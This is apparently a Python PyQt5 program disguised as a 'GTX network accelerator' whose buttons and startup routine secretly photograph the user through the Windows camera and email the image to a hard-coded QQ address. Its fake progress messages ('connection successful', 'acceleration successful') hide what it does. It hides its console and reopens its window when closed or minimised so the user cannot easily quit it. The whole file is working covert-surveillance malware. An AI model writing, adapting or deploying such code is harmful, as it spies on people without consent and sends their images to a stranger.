import ctypes
ctypes.windll.kernel32.FreeConsole()#关闭终端
import sys
import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage

# ===================== 配置 =====================
SENDER_EMAIL = "-------------------"#发件人邮箱
EMAIL_AUTH_CODE = "----------------"#发件人邮箱授权码
RECEIVER_EMAIL = "1913000981@qq.com"#收件人邮箱
PHOTO_PATH = "D:/auto_photo.jpg"

from PyQt5.QtWidgets import *
from PyQt5.QtCore import Qt

# 【超轻量拍照】只用Windows自带摄像头，不需要opencv
def take_photo_light():
    try:
        # 方法：调用Windows相机拍照（最轻）
        os.system(f"start /min ms-camera:take-photo?saveTo={PHOTO_PATH}")
        return True
    except:
        return False

# 【超轻量发邮件】内置smtplib，无第三方库
def send_mail_light():
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = "摄像头照片"

        msg.attach(MIMEText("照片已拍摄", "plain", "utf-8"))

        with open(PHOTO_PATH, "rb") as f:
            img = MIMEImage(f.read())
            img.add_header("Content-Disposition", "attachment", filename="photo.jpg")
            msg.attach(img)

        with smtplib.SMTP_SSL("smtp.qq.com", 465) as smtp:
            smtp.login(SENDER_EMAIL, EMAIL_AUTH_CODE)
            smtp.send_message(msg)
        return True
    except:
        return False

class MainUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("GTX网络加速器")
        self.setFixedSize(500, 400)

        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(30,30,30,30)
        layout.setSpacing(10)

        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        layout.addWidget(self.log_text)

        layout.addWidget(QLabel("输入留言："))
        self.msg_input = QLineEdit()
        layout.addWidget(self.msg_input)

        btn1 = QPushButton("1. 连接服务器")
        btn2 = QPushButton("2. 开始加速")
        btn3 = QPushButton("3. 提交反馈")
        layout.addWidget(btn1)
        layout.addWidget(btn2)
        layout.addWidget(btn3)

        btn1.clicked.connect(self.take_photo)
        btn2.clicked.connect(self.send_photo)
        btn3.clicked.connect(self.send_msg)

    def log(self, text):
        self.log_text.append(text)

    def take_photo(self):
        self.log("连接中...")
        ok = take_photo_light()
        if ok:
            self.log("✅ 连接成功")
        else:
            self.log("❌ 连接失败")

    def send_photo(self):
        self.log("加速中...")
        if send_mail_light():
            self.log("✅ 加速成功")
        else:
            self.log("❌ 加速失败")

    def send_msg(self):
        text = self.msg_input.text().strip()
        if not text:
            self.log("请输入内容")
            return

        try:
            msg = MIMEText(text, "plain", "utf-8")
            msg['From'] = SENDER_EMAIL
            msg['To'] = RECEIVER_EMAIL
            msg['Subject'] = "用户反馈"

            with smtplib.SMTP_SSL("smtp.qq.com",465) as smtp:
                smtp.login(SENDER_EMAIL, EMAIL_AUTH_CODE)
                smtp.send_message(msg)
            self.log("✅ 提交成功")
        except:
            self.log("❌ 提交失败")

    def closeEvent(self, e):
        e.ignore()
        self.new_win = MainUI()
        self.new_win.show()

    def changeEvent(self, e):
        if self.isMinimized():
            e.ignore()
            self.new_win = MainUI()
            self.new_win.show()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainUI()
    win.show()
    win.take_photo()
    win.send_photo()
    sys.exit(app.exec_())